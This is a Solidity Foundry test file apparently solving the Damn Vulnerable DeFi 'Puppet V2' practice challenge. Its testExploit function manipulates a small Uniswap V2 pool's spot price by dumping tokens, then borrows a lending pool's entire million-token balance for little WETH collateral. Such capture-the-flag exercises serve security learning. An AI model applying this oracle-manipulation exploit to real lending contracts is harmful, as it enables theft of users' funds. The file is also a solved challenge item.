// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import { Utilities } from "./Utilities.sol";
import "forge-std/Test.sol";

import { DamnValuableToken } from "../src/DamnValuableToken.sol";
import { WETH9 } from "../src/WETH9.sol";
import { PuppetV2Pool } from "../src/puppet-v2/PuppetV2Pool.sol";
import { IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair } from "../src/puppet-v2/Interfaces.sol";

contract PuppetV2 is Test {
    // Uniswap exchange will start with 100 DVT and 10 ETH in liquidity
    uint256 internal constant UNISWAP_INITIAL_TOKEN_RESERVE = 100e18;
    uint256 internal constant UNISWAP_INITIAL_ETH_RESERVE = 10 ether;

    // attacker will start with 10_000 DVT and 20 ETH
    uint256 internal constant ATTACKER_INITIAL_TOKEN_BALANCE = 10_000e18;
    uint256 internal constant ATTACKER_INITIAL_ETH_BALANCE = 20 ether;

    // pool will start with 1_000_000 DVT
    uint256 internal constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;
    uint256 internal constant DEADLINE = 10_000_000;

    IUniswapV2Pair internal uniswapV2Pair;
    IUniswapV2Factory internal uniswapV2Factory;
    IUniswapV2Router02 internal uniswapV2Router;

    DamnValuableToken internal dvt;
    WETH9 internal weth;

    PuppetV2Pool internal puppetV2Pool;
    address payable internal attacker;
    address payable internal deployer;

    function setUp() public {

        attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
        vm.label(attacker, "Attacker");
        vm.deal(attacker, ATTACKER_INITIAL_ETH_BALANCE);

        deployer = payable(address(uint160(uint256(keccak256(abi.encodePacked("deployer"))))));
        vm.label(deployer, "deployer");

        // Deploy token to be traded in Uniswap
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        weth = new WETH9();
        vm.label(address(weth), "WETH");

        // Deploy Uniswap Factory and Router
        uniswapV2Factory =
            IUniswapV2Factory(deployCode("./src/build-uniswap/v2/UniswapV2Factory.json", abi.encode(address(0))));

        uniswapV2Router = IUniswapV2Router02(
            deployCode(
                "./src/build-uniswap/v2/UniswapV2Router02.json", abi.encode(address(uniswapV2Factory), address(weth))
            )
        );

        // Create Uniswap pair against WETH and add liquidity
        dvt.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_ETH_RESERVE}(
            address(dvt),
            UNISWAP_INITIAL_TOKEN_RESERVE, // amountTokenDesired
            0, // amountTokenMin
            0, // amountETHMin
            deployer, // to
            DEADLINE // deadline
        );

        // Get a reference to the created Uniswap pair
        uniswapV2Pair = IUniswapV2Pair(uniswapV2Factory.getPair(address(dvt), address(weth)));

        assertGt(uniswapV2Pair.balanceOf(deployer), 0);

        // Deploy the lending pool
        puppetV2Pool = new PuppetV2Pool(
            address(weth),
            address(dvt),
            address(uniswapV2Pair),
            address(uniswapV2Factory)
        );

        // Setup initial token balances of pool and attacker account
        dvt.transfer(attacker, ATTACKER_INITIAL_TOKEN_BALANCE);
        dvt.transfer(address(puppetV2Pool), POOL_INITIAL_TOKEN_BALANCE);

        // Ensure correct setup of pool.
        assertEq(puppetV2Pool.calculateDepositOfWETHRequired(1 ether), 0.3 ether);

        assertEq(puppetV2Pool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE), 300_000 ether);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {

        vm.startPrank(attacker);
        console.log("Attacker's dvt balance before swap: ", dvt.balanceOf(attacker) / 1e18);
        console.log("Attacker's ETH balance before swap: ", attacker.balance / 1e18);

        dvt.approve(address(uniswapV2Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(dvt);
        path[1] = address(weth);
        uniswapV2Router.swapExactTokensForETH(dvt.balanceOf(attacker), 1 ether, path, attacker, block.timestamp + 5 days);

        console.log("Attacker's dvt balance after swap: ", dvt.balanceOf(attacker) / 1e18);
        console.log("Attacker's ETH balance after swap: ", attacker.balance / 1e18);

        console.log("Attacker's weth balance before deposit: ", weth.balanceOf(attacker) / 1e18);
        weth.deposit{value: attacker.balance}();
        console.log("Attacker's weth balance after deposit: ", weth.balanceOf(attacker) / 1e18);

        weth.approve(address(puppetV2Pool), type(uint256).max);
        uint256 poolBalance = dvt.balanceOf(address(puppetV2Pool));
        uint256 depositOfWETHRequired = puppetV2Pool.calculateDepositOfWETHRequired(poolBalance);
        console.log("depositOfWETHRequired: ", depositOfWETHRequired / 1e18);

        puppetV2Pool.borrow(poolBalance);

        console.log("Attacker's dvt balance after borrow: ", dvt.balanceOf(attacker) / 1e18);
        console.log("Attacker's weth balance after borrow: ", weth.balanceOf(attacker) / 1e18);

        vm.stopPrank();

        validation();
    }

    function validation() internal {
        assertEq(dvt.balanceOf(attacker), POOL_INITIAL_TOKEN_BALANCE);
        assertEq(dvt.balanceOf(address(puppetV2Pool)), 0);
        console.log(unicode"\n🎉🥳 Congratulations, you beat the level!!! 🥳🎉");
    }
}